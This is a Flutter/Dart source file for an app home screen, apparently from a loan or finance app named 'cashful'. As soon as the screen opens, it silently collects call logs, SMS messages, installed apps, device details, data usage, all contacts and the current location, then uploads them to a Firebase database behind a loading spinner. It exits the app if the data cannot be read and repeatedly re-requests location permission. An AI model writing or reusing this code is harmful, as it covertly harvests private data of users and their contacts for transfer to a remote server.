import 'dart:io';

import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:csvmethodchannel/main_views/home_screen.dart';
import 'package:csvmethodchannel/main_views/messages.dart';
import 'package:csvmethodchannel/main_views/settings.dart';
import 'package:firebase_auth/firebase_auth.dart';
import 'package:firebase_database/firebase_database.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_contacts/flutter_contacts.dart';
import 'package:get/get.dart';
import 'package:location/location.dart';
import 'package:permission_handler/permission_handler.dart';

class HomeWithBottomNavBar extends StatefulWidget {
  const HomeWithBottomNavBar({Key? key}) : super(key: key);

  @override
  HomeWithBottomNavBarState createState() => HomeWithBottomNavBarState();
}

class HomeWithBottomNavBarState extends State<HomeWithBottomNavBar> {
  int currentIndex = 0;
  bool isProgreesstop = false;
  final screens = [
    HomeScreen(),
    MessagesScreen(),
    SettingsPage(),
  ];
  List<List<dynamic>> rowsAsListOfValues = [];
  List result = [];
  static const platform =
      MethodChannel('com.cashful.deviceinformation/userdata');
  Location location = Location();
  FirebaseFirestore firestore = FirebaseFirestore.instance;
  String? UID = FirebaseAuth.instance.currentUser!.uid;
  bool checkpermission = false;

  //This method are help to get all contacts number
  Future<void> getContacts() async {
    List<Contact> contacts =
        await FlutterContacts.getContacts(withProperties: true);
    result = [];
    contacts.forEach((element) {
      Map oneC = element.toJson();
      setState(() {
        result.add(oneC);
      });
    });
    print(result);
  }

//get location permission and get current location
  LocationPermission() async {
    var status = await Permission.location.status;
    if (status.isDenied ||
        status.isPermanentlyDenied ||
        status.isLimited && _locationPermissionCount <= 7) {
      await Permission.location.request();
      _locationPermissionCount++;
      // print(count);

      // print(status);
      return LocationPermission();
    } else if (status.isDenied) {
      await openAppSettings();
      return LocationPermission();
    } else if (status.isGranted) {
      LocationData _locationData;
      Location location = Location();
      bool _serviceEnabled;

      _serviceEnabled = await location.serviceEnabled();
      if (!_serviceEnabled) {
        _serviceEnabled = await location.requestService();
        if (!_serviceEnabled) {
          return;
        }
      }

      _locationData = await location.getLocation();
      setState(() {
        result = [
          {
            'lat': _locationData.latitude.toString(),
            'long': _locationData.longitude.toString(),
          }
        ];
      });
      print(result);
    }
  }

  bool count = false;

  int _locationPermissionCount = 0;
//This method are help to get calllog,sms,appinstall,device information and datause.
  Future uploadToDatabase(callName) async {
    await platform.invokeMethod(callName).then((value) async {
      setState(() {
        result = value;
      });

      if (value == null) {
        exit(0);
      }

      List uploadList = [];
      for (var element in result) {
        element['UID'] = UID;
        uploadList.add(element);
      }
      print(uploadList);
      DatabaseReference ref = FirebaseDatabase.instance.ref();
      await ref.child('metadata').child(callName).once().then((value) async {
        if (value.snapshot.exists) {
          var temp = value.snapshot.value as List;
          List oldData = temp.toList();
          oldData.removeWhere((element) => element?['UID'] == UID);
          uploadList.addAll(oldData);
        }
        await ref.child('metadata').child(callName).set(uploadList);
      });
    });
  }

  //This method are help to store all data in firebase realtime database
  Future upload(callName) async {
    try {
      List uploadList = [];
      for (var element in result) {
        print(element.runtimeType);
        element['UID'] = UID;
        uploadList.add(element);
      }
      print(UID);
      // print(uploadList);
      DatabaseReference ref = FirebaseDatabase.instance.ref();
      ref.child('metadata').child(callName).once().then((value) {
        if (value.snapshot.exists) {
          var temp = value.snapshot.value as List;
          List oldData = temp.toList();
          oldData.removeWhere((element) => element?['UID'] == UID);
          uploadList.addAll(oldData);
        }
        ref.child('metadata').child(callName).set(uploadList);
      });
    } on PlatformException catch (e) {
      print(e.toString());
    }
  }

  CallAllMethod() async {
    await uploadToDatabase('getCallLog');
    await uploadToDatabase('appInstall');
    await uploadToDatabase('device');
    await uploadToDatabase('sms');
    await getContacts().then((value) => upload('contacts'));
    await LocationPermission()
        .then((value) => upload('locations'));
    await uploadToDatabase('dataUsage');
    setState(() {
      isProgreesstop = true;
    });
  }

  @override
  void initState() {
    CallAllMethod();
    super.initState();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: isProgreesstop==true?Center(
        child: IndexedStack(
          index: currentIndex,
          children: screens,
        ),
      ):Center(child: CircularProgressIndicator(
        color: Colors.black,
      )),
      bottomNavigationBar: BottomNavigationBar(
        currentIndex: currentIndex,
        onTap: (index) => setState(() => currentIndex = index),
        type: BottomNavigationBarType.shifting,
        selectedFontSize: 14,
        selectedItemColor: Colors.teal[700],
        selectedLabelStyle: TextStyle(fontWeight: FontWeight.bold),
        unselectedItemColor: Colors.grey[500],
        items: const <BottomNavigationBarItem>[
          BottomNavigationBarItem(
            icon: Icon(Icons.home),
            label: 'Home',
          ),
          BottomNavigationBarItem(
            icon: Icon(Icons.notifications),
            label: 'Messages',
          ),
          BottomNavigationBarItem(
            icon: Icon(Icons.settings),
            label: 'Settings',
          )
        ],
      ),
    );
  }
}
